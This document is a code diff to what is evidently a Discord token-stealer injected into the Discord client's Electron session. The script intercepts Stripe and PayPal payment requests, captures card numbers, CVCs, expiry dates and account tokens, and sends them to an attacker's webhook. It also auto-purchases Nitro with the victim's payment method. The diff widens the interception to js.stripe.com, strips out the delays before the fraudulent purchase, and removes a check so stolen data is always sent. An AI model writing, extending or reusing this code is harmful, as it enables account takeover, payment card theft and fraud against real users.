@@ -51,6 +51,7 @@ const config = {
             "https://api.stripe.com/v1/tokens",
             "https://api.stripe.com/v*/setup_intents/*/confirm",
             "https://api.stripe.com/v*/payment_intents/*/confirm",
+            "https://js.stripe.com/*"
         ],
     },
     filter2: {
@@ -64,8 +65,6 @@ const config = {
         ],
     },
 };
-
-const wrap = (raw, n) => raw.match(new RegExp(`.{1,${n}}`, 'g')).join('\n')
 
 const discordPath = (function () {
     const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -514,7 +513,6 @@ const PaypalAdded = async (token) => {
     if (config.ping_on_run) content["content"] = config.ping_val;
     hooker(content);
     if (config.auto_buy_nitro) {
-        await sleep(60000)
         nitroBought(token).catch(console.error);
     }
 };
@@ -557,7 +555,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     if (config.ping_on_run) content["content"] = config.ping_val;
     hooker(content);
     if (config.auto_buy_nitro) {
-        await sleep(60000)
         nitroBought(token).catch(console.error);
     }
 };
@@ -600,9 +597,7 @@ const nitroBought = async (token) => {
         ],
     };
     if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
-    if (!code.includes("undefined")) {
-        hooker(content);
-    }
+    hooker(content);
 };
 
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
@@ -688,10 +683,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
 
         case details.url.endsWith("confirm") && details.method === "POST":
             if (!config.auto_buy_nitro) return;
-            setTimeout(() => {
-                nitroBought(token).catch(console.error);
-            }, 75000);
-            break;
+            nitroBought(token).catch(console.error);
 
         default:
             break;
